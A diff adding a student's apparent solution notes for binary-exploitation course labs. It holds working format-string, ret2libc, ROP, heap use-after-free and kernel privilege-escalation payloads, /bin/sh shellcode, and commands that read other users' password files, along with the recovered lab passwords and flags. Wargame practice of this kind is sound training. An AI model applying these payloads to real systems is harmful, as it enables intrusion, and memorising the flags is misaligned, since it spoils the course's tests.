@@ -274,3 +274,386 @@ store
 quit
 
 The password printed out is sw00g1ty_sw4p_h0w_ab0ut_d3m_h0ps.
+* <2015-03-03 Tue> Lab 4
+** C
+(python -c "print '%08x'*40") | ./lab4C
+Resulting string is fed into a short script:
+
+a = 'bffff6080000001e0804b008b7e31bf8b7ff2d56b7fff000bffff724b7fff55cb7fffaf0000000000804b0080000001e7562000074315f377334775f625f376e337455727230665f623433630021653178383025783830257838302578383025'
+b = [a[i:i+8] for i in range(0, len(a), 8)]
+for i in xrange(len(b)):
+    c = b[i]
+    d = [c[j:j+2] for j in range(0, len(c), 2)]
+    b[i] = "".join(d[::-1])
+print "".join(b)
+
+which is converted to ascii, and contains the password:
+bu7_1t_w4sn7_brUt3_f0rc34b1e!
+** B
+Strategy: overwrite the exit() GOT address, located at 0x080499b8, to point to an environment variable with our shellcode.
+
+shellscript to put in environment variable (execv /bin/sh): 
+export SBAHJ=$(python -c "print '\x90' * 2000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
+
+Get address with textbook's address finding program:
+SBAHJ address: 0xBFFFF052
+
+Work with fmt_lec02 to get the correct number of bytes to write to the vulnerable printf:
+lec02 test payload: python -c "print '\x4c\xf6\xff\xbfBUTT\x4e\xf6\xff\xbfBUTT' + '%08x' * 4 + '%061474x' + '%hn' + '%053165x' + '%hn'" | ./fmt_lec02
+
+Then take those values over to the real program:
+real payload: (python -c "print '\xb8\x99\x04\x08BUTT\xba\x99\x04\x08BUTT' + '%08x' * 4 + '%061474x' +'%hn' + '%053165x' + '%hn'"; cat;) | /levels/lab4/fmt_labB
+
+fg3ts_d0e5n7_m4k3_y0u_1nv1nc1bl3
+** A
+Strategy: overwite log_wrapper() EIP to go to environment variable.  Shellcode is same as lab4B.
+
+SBAHJ address: 0xbffff16f
+try for 0xbffff3c7
+
+This address is overwritten using lecture fmt_02 binary:
+python -c "print 'AAAA\xcc\xee\xff\xbfBUTT\xce\xee\xff\xbfBUTT' + '%08x' * 5 + '%062347x' + '%hn' + '%052280x' + '%hn'" | ./fmt_lec02
+
+In the real program:
+EIP: 0xbfffeecc
+fixenv /levels/lab4/fmt_labA $(python -c "print 'A\xcc\xee\xff\xbfBUTT\xce\xee\xff\xbfBUTT' + '%08x' * 5 + '%062350x' + '%hn' + '%052280x' + '%hn'")
+
+1t_w4s_ju5t_4_w4rn1ng
+* <2015-03-13 Fri> Lab 5
+** C
+System at 0xb7e65190
+buffer at 0xbffffab0
+global at 0x0804a060
+python -c "print 'cat /home/lab5B/.pass\x00' + 'A' * 134 + '\x90\x51\xe6\xb7' + 'BBBB\x60\xa0\x04\x08'" | ./lab5C
+
+s0m3tim3s_r3t2libC_1s_3n0ugh
+** B
+
+Use a few gadgets:
+
+Initialize registers
+0x0806ec7b  adc eax, 0x80ea9f0 ; pop edx ; pop ecx ; pop ebx ; ret
+0x0805c61e  add eax, 0x5e000002 ; xor eax, eax ; pop ebx ; ret
+Increment EAX 11x
+0x0807b745  inc eax; ret
+Execute
+0x0806f31e  int 0x80
+
+Place "/bin/sh" as a command line arg @ 0xbffff955
+
+Throw it all together:
+(python -c "print 'A'*140 + '\x7b\xec\x06\x08' + '\x00'*12 + '\x1e\xc6\x05\x08' + '\x55\xf9\xff\xbf' + '\x45\xb7\x07\x08'*11 + '\x1e\xf3\x06\x08'"; cat;) | fixenv /levels/lab5/lab5B /bin/sh
+
+th4ts_th3_r0p_i_lik3_2_s33
+** A
+This problem involved doing some stack pivoting and dealing with the new constraint 
+that we may not index into data past the end of the buffer.  This constraint prevents 
+us from overwriting the EIP of main(), we must use a negative index into data in order 
+to overwrite the EIP of store_number() instead.  
+
+Because environment variables and command line args are zerod out, "/bin/sh" must be 
+placed on the stack in data.  The address into which it is placed is found in fixenv 
+gdb, and the input is altered to match.  
+
+location of data: 0xbffff5d8
+store_number EIP: 0xbffff5ac
+The difference between these two addresses is 44, so the EIP can be overwritten 
+at index -11. 
+
+"/bin/sh" on stack: 0xbffff618
+
+Layout of data at the time of first gadget execution:
+[-11] 0x08049b77 : add esp, 0x2c ; ret
+[  1] 0x0806f390 : pop edx ; pop ecx ; pop ebx ; ret
+[  2] 0x00000000
+[  3] DOOM
+[  4] 0xbffff618 (addr of /bin/sh)
+[  5] 0x0806c069 : add esp, 4 ; ret
+[  6] DOOM
+[  7] 0x08054bf0 : xor eax, eax ; ret
+[  8] 0x0806c069 : add esp, 4 ; ret
+[  9] DOOM
+[ 10] 0x080481b2 : ret
+[ 11] 0x080966a2 : add eax, 0xb ; pop edi ; ret
+[ 12] DOOM
+[ 13] 0x08049741 : int 0x80
+[ 14] 0x00000000
+[ 15] DOOM
+[ 16] 0x0068732f "/sh"
+[ 17] 0x6e69622f "/bin"
+
+Input that produces this layout:
+store
+134673296
+1
+store
+3221222936
+4
+store
+134660201
+5
+store
+134564848
+7
+store
+134660201
+8
+store
+134513074
+10
+store
+134833826
+11
+store
+134518593
+13
+store
+1852400175
+16
+store
+6845231
+17
+store
+134519671
+-11
+
+byp4ss1ng_d3p_1s_c00l_am1rite
+* <2015-03-25 Wed> project 1
+** pass: m0_tw33ts_m0_ch4inz_n0_m0n3y
+* <2015-04-03 Fri> lab 6
+** C
+Partial overwrite EIP.  Restrict overwrite of msglen to magic number.  
+(python -c "print 'A'*40 + '\xc5' + 'D'*282 + '\x13\ncat /home/lab6B/.pass'") | /levels/lab6/lab6C
+
+p4rti4l_0verwr1tes_r_3nuff
+** B
+hash_pass() goes out of bounds of its array args when you write 32 chars to
+them.  Use XOR magic to alter EIP.  Do one pass to read the current EIP and one
+to alter it.  Handle the fact that it's XORs all the way down.  Python script is
+attached.  
+
+strncpy_1s_n0t_s0_s4f3_l0l
+** A
+1. Write 'cat /home/lab6end/.pass\x00\n' to ulisting's name with option 2.
+2. Do a partial overwrite on merchant's sfunc by overflowing uinfo's name/desc 
+to go to print_name().  This works 1/16th of the time.  Because of the overwrite,
+print_name() prints out the location of sfunc.  Info status: leaked.
+3. Head on over to make_note to abuse that gets().  Overwrite EIP to go to system()
+(thanks to no PIE) and use the address of the string we wrote in step 1 as the arg.  
+Python script is attached.
+
+eye_gu3ss_0n_@ll_mah_h0m3w3rk
+* <2015-04-10 Fri> lab7
+** C
+Abuse some use after free in order to get an infoleak on the address of small_str(),
+then just offset the resulting address in order to get the address of system.  
+
+Input/calculations:
+offset = small_str - system
+2
+1
+4
+1
+A
+6
+1
+system_addr = resulting number - offset
+1
+/bin/sh
+3
+2
+system_addr
+5
+2
+cat /home/lab7B/.pass
+
+us3_4ft3r_fr33s_4re_s1ck
+** B
+fr33bie_f0r_th1s_w33k
+* <2015-04-17 Fri> lab8
+** C
+1st arg: open the pass, gets set to file descriptor 3.
+2nd arg: file descriptor 3.  Magic.
+./lab8C -fn=/home/lab8B/.pass -fd=3
+<<<For security reasons, your filename has been blocked>>> is lexicographically equivalent to 3v3ryth1ng_Is_@_F1l3
+** B
+The offset in fave() is pretty incorrect, only advancing by a byte every time.
+So you put the address of the win function (gotten from included infoleak) into
+the unsigned int e and put 1 into everything else.  Sum the vectors, save the
+result 5 times.  unsigned int e has now been written over the function pointer.
+Load index 4 (5th) vector into vector 1 and print it.  We now have a shell.
+
+Th@t_w@5_my_f@v0r1t3_ch@11
+** A
+findSomeWords() is a great big ruse.  There's a vulnerable printf in
+selectABook() with which we can win.  Because selectABook() can recursively call
+itself, we can take multiple runs at this printf().  With the first run, we leak
+the address of buf_secure (the first 4 bytes after the printf) and the value of
+the canary (the 130th parameter).  We enter a recursive call.  We offset the
+buf_secure address to reach buf_secure in this new stack frame.  We put the
+string "/bin/sh" on the buffer, then, being sure to preserve the canary, begin
+writing a ROP chain beginning at EIP (132nd parameter to the printf()).  The ROP
+chain calls execv() with the shell string as its arg.  scanf() doesn't like a
+lot of bytes that could be interpreted as whitespace, so the gadget addresses
+can't contain things like \x0a.  With the shell open, we cat the password.
+
+flag{H4x0r5_d0nt_N33d_m3t4pHYS1c5}
+* <2015-04-24 Fri> lab9
+** C
+offset = 157453
+main's stack canary at 257
+main's EIP at 261
+/bin/sh string: system+1181844
+
+There's a problem with the class constructor: len is initialized after
+alloc_len, thus alloc_len is initialized to some big value.  We can abuse this
+to overflow the array and read down the stack to overwrite EIP to take us to
+system while preserving the stack canary.  
+
+1_th0uGht_th4t_w4rn1ng_wa5_l4m3
+** B
+RP1S3C_Nuk3_i5_R3aDy!
+** A
+memory layout of hashset with size 2:
+            vTable      m_size      hash_func?  set_data ptr
+0x5655a030:	0x56558e50	0x00000002	0x00000000	0x5655a048
+0x5655a040:	0x00000000	0x00000011	0x00000000	0x00000001
+            2 bullshit bytes wtf    set_data[0]        [1]
+
+memory layout of 2 identical hashsets allocated one after the other
+            vTable      m_size      hash_func?  set_data*
+0x5655a030:	0x56558e50	0x00000002	0x00000000	0x5655a048
+            2 bullshit bytes wtf    set_data[0]        [1]
+0x5655a040:	0x00000000	0x00000011	0x00000000	0x00000001
+            2 more bullshit bytes   vTable      m_size
+0x5655a050:	0x00000000	0x00000019	0x56558e50	0x00000002
+            hash_func?  set_data*   2 bullshit bytes wtf
+0x5655a060:	0x00000000	0x5655a070	0x00000000	0x00000011
+            set_data[0] set_data[1] 
+0x5655a070:	0x00000000	0x00000001	0x00000000	0x00020f89
+
+how 2 overwrite vtable:
+make 0 size 2
+make 1 size whatever
+delete 1
+delete 0
+make 0 size 4
+add 4 to 0
+call anything on 1
+segfault
+
+when you delete an object its vtable pointer is zerod out whyyyyy
+
+vtable - system = 2776256
+
+3 hashsets of size 2:
+
+            vTable      m_size      hash_func?  set_data*
+0x5655a058:	0x56558e50	0x00000002	0x00000000	0x5655a070
+            2 bullshit words wtf    set_data[0]        [1]
+0x5655a068:	0x00000000	0x00000011	0x00000000	0x00000000
+            2 more bullshit words   vTable      m_size
+0x5655a078:	0x00000000	0x00000019	0x56558e50	0x00000002
+            hash_func?  set_data*   2 bullshit words wtf
+0x5655a088:	0x00000000	0x5655a098	0x00000000	0x00000011
+            set_data[0] set_data[1] 2 more bullshit words
+0x5655a098:	0x00000000	0x00000000	0x00000000	0x00000019
+            vTable      m_size      hash_func?  set_data*
+0x5655a0a8:	0x56558e50	0x00000002	0x00000000	0x5655a0c0
+            2 bullshit words wtf    set_data[0]        [1]
+0x5655a0b8:	0x00000000	0x00000011	0x00000000	0x00000000
+0x5655a0c8:	0x00000000	0x00020f39	0x00000000	0x00000000
+
+how 2 leak vtable:
+make 0, 1, 2, size 2
+delete 1
+delete 0
+make 0 size 6
+add 5*big number to 0
+get 4 from 1
+
+after freeing 1 then 0
+gdb$ x/40x set_vec
+0x5655a008:	0x5655a030	0x5655a058	0x5655a080	0x00000000
+0x5655a018:	0x00000000	0x00000000	0x00000000	0x00000000
+------------------------- set_vec ------------------------
+            p chnk size chnk size   fd ptr      bk ptr?
+0x5655a028:	0x00000000	0x00000019	0x5655a050	0x00000002
+            hash func?  set_data*   p chnk size chnk size
+0x5655a038:	0x00000000	0x5655a048	0x00000000	0x00000011
+            fd ptr      bk ptr      p chnk size chnk size
+0x5655a048:	0x5655a068	0x00000000	0x00000000	0x00000019
+            fd ptr      bk ptr?     hash func?  set_data*
+0x5655a058:	0x00000000	0x00000002	0x00000000	0x5655a070
+            p chnk size chnk size   fd ptr      bk ptr
+0x5655a068:	0x00000000	0x00000011	0x00000000	0x00000000
+            p chnk size chnk size   vTable      m_size
+0x5655a078:	0x00000000	0x00000019	0x56558e50	0x00000002
+            hash func?  set_data*   p chnk size chnk size
+0x5655a088:	0x00000000	0x5655a098	0x00000000	0x00000011
+            set_data[0] set_data[1] 
+0x5655a098:	0x00000000	0x00000D000	0x00000000	0x00020f61
+
+----------------------------------------------------------------
+By constructing and deleting some big lockboxes, you can cajole some 
+magic address onto the heap that points into .text.  I can't explain it 
+but thankfully neither can anyone in charge of this lab.  
+
+We can leak this address and an address on the heap by aligning a new
+lockbox over the rotting corpses of those other ones and get()ing some
+information.  System is a fixed offset from this magic address.
+
+We can finally do a use after free by overwriting the vtable of a deallocated
+object to point to an array we control (gotten as an offset from the leaked heap
+address).  Into this array we pour our cruelty, our malice, our will to dominate
+all life, and a pointer to system plus one to the string ";sh;".  Call the
+method corresponding to the index in our fake vtable we've constructed (in this
+case, add()) and cat the password.
+
+1_d1dNt_3v3n_n33d_4_Hilti_DD350
+* <2015-05-01 Fri> lab10
+** C
+PIN: ux8ddjVJek
+
+Write a separate C program to mmap the memory around 0x0 to executable, then
+memcpy a shell script that does:
+
+xor eax, eax
+mov ebx, 0xc10488d7
+call ebx
+mov ebx, 0xc1048a69
+call ebx
+ret
+
+to 0x0.  Write 0xcafebabe to the device twice, once to get algo_xor pointing to
+0x0, another to get the device to execute the code at 0x0.  The C program's 
+priveleges are now escalated, so call system() from there.
+
+flag{I_h@v3_null_!d34_wut_!m_d0inG}
+** A
+PIN: 2Moc249okN
+* <2015-05-10 Sun> project 2
+** set keyauth flags
+b *(main+0x11C)
+break at program_nuke checksum comparison
+b *0x56558bb3
+
+write the keyauth flags, turn off sleeps
+set *($eax+0x10) = 0xCAC380CD
+set *($eax+0x14) = 0xBADC0DED
+set *($eax+0x18) = 0xACC3D489
+set *(0x565562f9) = 0x90909090
+set *(0x565562f9+1) = 0x90909090
+
+input code for checksum
+set *(0x56562220) = 0xDCDC59A9
+break at launch_nuke setup
+b *0x56558d1c
+break at launch_nuke jump table
+b *0x565590f7
+break at launch_nuke right before call detonate_nuke
+b *0x56559244
+Detonate on general doom with:
+SGISEISNISEISRISAISLIS ISDISOISOISMDOOM
+
+th3_pr1nt_funct10n_w4s_100_l!n3s_al0ne
